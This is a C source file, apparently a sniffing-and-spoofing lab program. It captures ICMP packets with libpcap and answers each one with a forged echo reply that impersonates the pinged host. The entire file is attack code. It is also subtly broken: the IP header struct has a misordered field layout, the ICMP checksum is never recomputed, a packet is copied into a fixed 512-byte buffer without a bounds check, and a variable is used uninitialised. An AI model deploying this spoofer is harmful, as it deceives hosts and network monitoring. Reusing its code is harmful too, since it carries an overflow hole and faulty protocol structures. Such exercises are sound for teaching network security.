#include <stdio.h>
#include <arpa/inet.h>
#include <ctype.h>
#include <netinet/ip.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <pcap.h>


#define BUFFER 512


// ICMP struct
struct icmpheader 
{
	unsigned char type;
	unsigned char code;
	unsigned short int checksum;
	unsigned short int id; 
	unsigned short int seq;
};


//  IP header struct
struct ipheader 
{
	
	unsigned char ip_hl: 4; 
	unsigned char ip_v: 4; 
	unsigned short int ip_flag: 3; 
	unsigned short int ip_off: 13; 
	unsigned char ip_tos;
	unsigned short int ip_len;
	unsigned short int ip_id;
	unsigned char ip_ttl;
	unsigned char ip_protocol;
	unsigned short int ip_checksum;
	struct in_addr source_ip;
	struct in_addr destination_ip;
};



// etherent header struct
struct ethheader 
{
	u_char ether_dhost [6];
	u_char ether_shost [6];
	u_short ether_type;
};


void send_packet(struct ipheader* ip_packet)
{
	
	struct sockaddr_in sockaddr;
	int enable = 1;
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (sock < 0)
	{
		printf("Unable to create socket.\n");
		return;
	}
	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));
	sockaddr.sin_family = AF_INET;
	sockaddr.sin_addr = ip_packet->destination_ip;

	// Send the packet
	sendto(sock, ip_packet, ntohs(ip_packet->ip_len), 0, (struct sockaddr *)&sockaddr, sizeof(sockaddr));
	printf(" An unreal ICMP packet has been sent\n");
	close(sock);
}


void got_packet(u_char *args, const struct pcap_pkthdr *header,const u_char *packet)
{
	
	struct ethheader *ethernet_packet = (struct ethheader*)packet;
	if (ntohs(ethernet_packet->ether_type) == 0x0800) 
	{
		struct ipheader *ip_packet = (struct ipheader*)(packet + sizeof(struct ethheader));
		if (ip_packet->ip_protocol == IPPROTO_ICMP)
		{
			printf("ICMP packet has been capture:\n");
			char buf[BUFFER];
			// copy all our information to the buffer
			memset((char*)buf, 0, BUFFER);
			memcpy((char*)buf, ip_packet, ntohs(ip_packet->ip_len));
			struct ipheader* forged_ip_packet = (struct ipheader*)buf;
			struct icmpheader* forged_icmp_packet = (struct icmpheader*)(buf + (ip_packet->ip_hl * 4));

			// Send out the reply as the actual destination of the ICMP packet.
			forged_ip_packet->destination_ip = ip_packet->source_ip;
			forged_ip_packet->source_ip = ip_packet->destination_ip;
			forged_ip_packet->ip_ttl = 64;
			forged_icmp_packet->type = 0;   // Echo replay type
			send_packet(forged_ip_packet);
		}
	}	
}



int main()
{
	pcap_t *handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct bpf_program fp;
	char filter_exp[] = "icmp"; // we want to capture icmp packets only!
	bpf_u_int32 net;

	handle = pcap_open_live("enp0s3", BUFSIZ, 1, 1000, errbuf); 
	if (handle == NULL)
	{
		printf("An error in pcap_open_live has been happend.\n");
		return -1;
	}

	pcap_compile(handle, &fp, filter_exp, 0, net);      
	pcap_setfilter(handle, &fp);                             
	pcap_loop(handle, -1, got_packet, NULL);                
	pcap_close(handle);  

	return 0;
}
